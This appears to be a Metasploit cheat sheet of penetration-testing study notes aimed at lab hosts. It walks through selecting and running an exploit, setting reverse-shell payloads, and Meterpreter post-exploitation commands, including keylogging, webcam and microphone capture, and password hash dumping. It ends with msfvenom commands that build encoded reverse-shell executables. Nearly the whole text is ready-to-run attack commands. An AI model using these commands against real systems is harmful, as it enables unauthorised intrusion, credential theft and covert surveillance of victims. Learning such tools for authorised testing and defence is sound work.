# Metasploit

## Msfconsole

### Exploring

Start: `msfconsole`

View auxiliary modules: `show auxiliary`

Use modules: `use auxiliary/scanner/snmp/snmp_enum`

View module options: `show options`

Set global session values: `setg RHOSTS 10.11.1.5`

### Database access

MSF logs findings and information about discovered hosts in a database

View discovered hosts: `hosts`

Use the db\_nmap wrapper to scan: `db_nmap 10.11.1.5`

Search for machines open ports: `services -p 443`

### Exploit modules

Search exploits: `search pop3`

Use exploit: `use exploit/windows/pop3/seattlelab_pass`

View options: `show options`

Set options: `set RHOST 10.11.1.5`

View payloads: `show payloads`

Select payload: `set payload windows/shell/reverse_tcp`

View payload options: `show options`

Once configured, run exploit: `exploit`

### Meterpreter payloads – provide additional features and functionality

View system info: `sysinfo`

View UID: `getuid`

Search files: `search string`

Upload files: `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec` two  characters required to prevent shell escaping

Download files: `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`

Invoke a command shell: `shell`

Reverse HTTPS Meterpreter – like a standard meterpreter payload but the communications over the network look like normal HTTPS traffic `Msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe`

### Post exploitation

`help` displays a list of available meterpreter post exploitation commands

Includes: download, upload, portfwd, route, keyscan\_start/stop, screenshot, record\_mic, webcam\_snap, getsystem \(priv esc\), hashdump

Useful tool for finding priv esc options `use post/multi/recon/local_exploit_suggester`

### Msfvenom

Payload `-p` Selects the payloads to use

List `-l` List a module type \(payloads, encoders, nops, all\)

Nopsled `-n` Prepends a nopsled on the payload

Output format `-f` Use --help-format for a list

Encoder `-e` Encoder to use

Space `-s` The maximum space to use for the payload

Architecture `-a` The architecture to use for the payload \(example: x86\)

Platform `--platform` Use --help-platforms to list available options

Bad character `-b` The list of characters to avoid

`Msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c`

`Msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c -e x86/shikata_ga_nai -b “\x00\x0a\x0d”`

Using ExitThread instead of ExitProcess can help prevent crashing the program

`Msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b “\x00\x0a\x0d”`

